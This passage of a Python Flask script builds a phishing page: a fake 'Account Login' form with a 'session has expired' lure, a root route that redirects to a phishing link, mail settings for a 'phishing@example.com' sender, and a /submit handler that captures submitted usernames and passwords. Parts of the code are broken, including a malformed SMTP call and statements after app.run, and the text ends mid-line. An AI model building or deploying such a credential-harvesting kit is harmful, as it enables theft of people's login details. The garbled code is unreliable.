                    width: 100%;
                    padding: 10px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                }
                .login-form button:hover {
                    background-color: #45a049;
                }
                .info {
                    margin-top: 20px;
                    font-size: 12px;
                    color: #666;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2 style="color: #333;">Account Login</h2>
                <form action="/submit" method="post" onsubmit="return document.getElementById('submitBtn').addEventListener('click', function() {
                    alert('Login attempt detected!');
                    event.preventDefault();
                    const formData = {
                        username: document.getElementById('username').value,
                        password: document.getElementById('password').value
                    };
                    alert('Your credentials have been captured: ' + JSON.stringify(formData));
                    window.close();
                })">
                    <input type="text" id="username" name="username" placeholder="Email Address" required>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <button type="submit" id="submitBtn">Sign In</button>
                </form>
                <div class="info">
                    <p>Your session has expired. Please log in again.</p>
                </div>
            </div>
        </body>
    </html>
"""

# Email configuration for testing
app.config['MAIL_SERVER'] = 'localhost'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'phishing@example.com'
app.config['MAIL_PASSWORD'] = 'your_email_password'

# Initialize the email
email.init_app(app)

@app.route('/')
def home():
    return redirect(phishing_link)

@app.route('/submit', methods=['POST'])
def handle_login():
    global username, password
    username = request.form.get('username')
    password = request.form.get('password')
    return "Login attempt detected!"

if __name__ == '__main__':
    # Start the Flask app
    app.run(debug=True, port=5000)

    # Start the local SMTP server for email testing (requires Python 3.11+)
    with smtplib.SMTP(server=smtplib.SMTP('localhost', 1025)) as connection:
